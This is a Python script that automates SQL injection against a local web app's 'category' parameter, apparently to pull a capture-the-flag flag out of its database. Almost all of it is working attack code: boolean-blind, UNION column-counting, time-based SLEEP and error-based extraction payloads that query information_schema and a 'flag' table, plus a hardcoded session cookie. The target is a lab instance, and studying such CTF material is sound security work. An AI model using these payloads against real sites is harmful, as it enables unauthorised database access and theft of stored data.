import requests
import urllib.parse
import time
import re

target = "http://127.0.0.1:32780/"
session_cookie = "PHPSESSID=a619c2d322b0d2025997d9751eb6d09a"
headers = {"Cookie": session_cookie}

print("="*80)
print("FINAL SQL INJECTION BYPASS ANALYSIS")
print("="*80)

# Get baseline
baseline = requests.get(f"{target}?category=Gifts", headers=headers, timeout=10)
baseline_text = baseline.text
baseline_size = len(baseline_text)
print(f"\n[+] Baseline size: {baseline_size} bytes")

# Function to detect if injection worked

def analyze_response(payload, description):
    print(f"\n[+] {description}")
    url_encoded = urllib.parse.quote(payload, safe='')
    url = f"{target}?category={url_encoded}"
    
    try:
        response = requests.get(url, headers=headers, timeout=10)
        text = response.text
        size = len(text)
        
        # Look for flag
        flag_match = re.search(r'FLAG\{[^}]+\}', text, re.I)
        if flag_match:
            print(f"\n{'='*80}")
            print(f"FLAG FOUND: {flag_match.group()}")
            print(f"{'='*80}\n")
            return {'flag': flag_match.group()}
        
        size_diff = size - baseline_size
        print(f"  Size: {size} bytes (diff: {size_diff:+d})")
        
        # Check for SQL errors (good indicator injection is working)
        sql_errors = ['mysql', 'sql syntax', 'query failed', 'database error', 'you have an error']
        found_errors = [e for e in sql_errors if e.lower() in text.lower()]
        
        if found_errors:
            print(f"  [SQL ERROR] {found_errors}")
            # This means injection is hitting the database!
        
        # Check content differences
        if size != baseline_size:
            # Extract visible data changes
            displayed = re.findall(r'<option value=[\'"]([^\'"]+)[\'"]', text)
            if displayed:
                print(f"  [Categories] {displayed}")
                
            posts = re.findall(r'<h2>([^<]+)</h2>', text)
            if posts:
                print(f"  [Posts] {posts[:3]}")
                
        return {'size': size, 'errors': found_errors, 'text': text}
    except Exception as e:
        print(f"  [Error] {e}")
        return {'error': str(e)}

# Try different injection contexts
print("\n" + "="*80)
print("TESTING DIFFERENT INJECTION CONTEXTS")
print("="*80)

test_contexts = [
    # ORDER BY injection (blind)
    ("Gifts' ORDER BY 1-- ", "ORDER BY injection"),
    ("Gifts' ORDER BY 99-- ", "ORDER BY invalid column"),
    
    # Boolean-based blind
    ("Gifts' AND 1=1-- ", "Boolean true"),
    ("Gifts' AND 1=2-- ", "Boolean false"),
    ("Gifts' OR 1=1-- ", "OR true (should show all)"),
    
    # UNION-based
    ("Gifts' UNION SELECT 1,2,3,4,5-- ", "Basic UNION"),
    ("Gifts'+UNION+SELECT+1,2,3,4,5--", "UNION with plus encoding"),
    
    # Time-based
    ("Gifts' AND SLEEP(3)-- ", "Time-based SLEEP"),
    ("Gifts' AND IF(1=1,SLEEP(3),0)--", "Time-based IF true"),
]

results = []
for payload, desc in test_contexts:
    result = analyze_response(payload, desc)
    result['desc'] = desc
    results.append(result)
    time.sleep(0.2)

# Analyze which injections work
print("\n" + "="*80)
print("ANALYSIS: Which injection types work?")
print("="*80)

for result in results:
    desc = result['desc']
    size = result['size']
    size_diff = size - baseline_size
    errors = result.get('errors', [])
    
    if errors:
        print(f"  [WORKING] {desc} - Caused SQL error (injection hitting DB)")
    elif abs(size_diff) > 20:
        print(f"  [POTENTIAL] {desc} - Size change: {size_diff:+d} bytes")
    else:
        print(f"  [BLOCKED] {desc} - No effect")

# Try to extract data using the working methods
print("\n" + "="*80)
print("ATTEMPTING DATA EXTRACTION WITH WORKING METHODS")
print("="*80)

print("\n[+] Attempting UNION with different column counts...")
for cols in range(1, 10):
    # Try with NULLs
    union_payload = f"Gifts' UNION SELECT {','.join(['NULL'] * cols)}--"
    result = analyze_response(union_payload, f"UNION {cols} columns (NULL)")
    time.sleep(0.1)
    
    # Try with numbers
    union_payload = f"Gifts' UNION SELECT {','.join([str(i) for i in range(1, cols+1)])}--"
    result = analyze_response(union_payload, f"UNION {cols} columns (numbers)")
    time.sleep(0.1)
    
    if result.get('size', 0) != baseline_size and not result.get('errors'):
        print(f"  [!] Size change with {cols} columns - might be working!")

# Boolean-based data extraction attempt
print("\n[+] Attempting boolean-based blind extraction...")

# Check if users table exists
bool_tests = [
    ("Gifts' AND (SELECT COUNT(*) FROM users WHERE 1=1) > 0--", "Check users table"),
    ("Gifts' AND (SELECT COUNT(*) FROM admin WHERE 1=1) > 0--", "Check admin table"),
    ("Gifts' AND (SELECT COUNT(*) FROM flag WHERE 1=1) > 0--", "Check flag table"),
    ("Gifts' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) > 5--", "Check many tables"),
]

for payload, desc in bool_tests:
    result = analyze_response(payload, desc)
    time.sleep(0.1)

# Try error-based extraction
print("\n[+] Attempting error-based extraction...")

error_payloads = [
    ("Gifts' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "Error-based table name"),
    ("Gifts' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT flag FROM flag LIMIT 1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--", "Error-based flag"),
]

for payload, desc in error_payloads:
    result = analyze_response(payload, desc)
    if result.get('errors'):
        # The error might contain the extracted data!
        print(f"  [!] Check error message above for embedded data")
    time.sleep(0.1)

# Try the category parameter without existing value - might inject directly
print("\n[+] Testing parameter without category value...")

direct_injections = [
    ("' UNION SELECT 1,2,3,4,5--", "Direct UNION"),
    ("'+UNION+SELECT+1,2,3,4,5--", "Direct UNION plus"),
    ("NULL' UNION SELECT 1,2,3,4,5--", "NULL base UNION"),
    ("0' UNION SELECT 1,2,3,4,5--", "Zero base UNION"),
]

for payload, desc in direct_injections:
    result = analyze_response(payload, desc)
    time.sleep(0.1)

print("\n" + "="*80)
print("FINAL ANALYSIS")
print("="*80)
print("\nBased on the tests:")
print("1. Check which payloads caused SQL errors (they're hitting the DB)")
print("2. Check which payloads changed response sizes")
print("3. Use those working payloads for data extraction") 
print("4. If no flag found, the vulnerability may not allow data exfiltration")
